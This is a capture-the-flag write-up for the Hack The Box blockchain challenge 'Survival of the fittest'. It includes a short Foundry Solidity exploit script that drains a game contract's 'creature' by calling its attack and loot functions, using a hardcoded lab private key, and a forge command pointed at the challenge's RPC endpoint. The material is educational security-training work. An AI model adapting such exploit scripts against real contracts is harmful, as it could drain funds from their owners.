---
slug: /write-up/htb/challenges/survival-of-the-fittest
pagination_next: null
pagination_prev: null
---

# Survival of the fittest

https://app.hackthebox.com/challenges/Survival%2520of%2520the%2520Fittest

Alex had always dreamed of becoming a warrior, but she wasn't particularly skilled. When the opportunity arose to join a group of seasoned warriors on a quest to a mysterious island filled with real-life monsters, she hesitated. But the thought of facing down fearsome beasts and emerging victorious was too tempting to resist, and she reluctantly agreed to join the group. As they made their way through the dense, overgrown forests of the island, Alex kept her senses sharp, always alert for the slightest sign of danger. But as she crept through the underbrush, sword drawn and ready, she was startled by a sudden movement ahead of her. She froze, heart pounding in her chest as she realized that she was face to face with her first monster.

This is very similar to `Distrack And Destroy` challenge. It's a blockchain challenge where you need to set the balance of the creature to zero to solve it.

The script is really simple, just define the interface or the creature, call the attack function and then loot:

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";

interface ICreature {
    function strongAttack(uint256 _damage) external;
    function loot() external;
}

contract Exploit is Script {
    uint256 constant PRIVATE_KEY = 0x85326f106a23ac84cf6be593ed479aeeed9e0fadaaf9497fea203c406888eead;
    address constant PLAYER_ADDRESS = 0x5D612DA7e8aC61beB2457b53b5f438264E086a5d;
    address constant CREATURE_ADDRESS = 0x17D8DdE823914C2423c9997b40c226114e14EC53;
    address constant SETUP_ADDRESS = 0x98B20fE76986B32Eeb7c77D554Edb6f2a9978919;

    function run() external {
        // Start broadcasting from player's EOA private key
        vm.startBroadcast(PRIVATE_KEY);

        ICreature creature = ICreature(CREATURE_ADDRESS);

        // Step 1: Strong attack to remove all life points
        creature.strongAttack(20);

        // Step 2: Loot
        creature.loot();


        vm.stopBroadcast();
    }
}
```
And call it with `forge`:

```bash
forge script Exploit.s.sol:Exploit --rpc-url http://94.237.51.157:58017/rpc --broadcast
```

Then in the website in other blockchain challenge, when you click attack, the flag was revealed when the condition is met. However, this is not the case. Checking the source code, the button just does some css non-sense, nothing related with the flag.

However, there's a `flag` function defined. We just need to call it from the Brwoser developer console and that's it.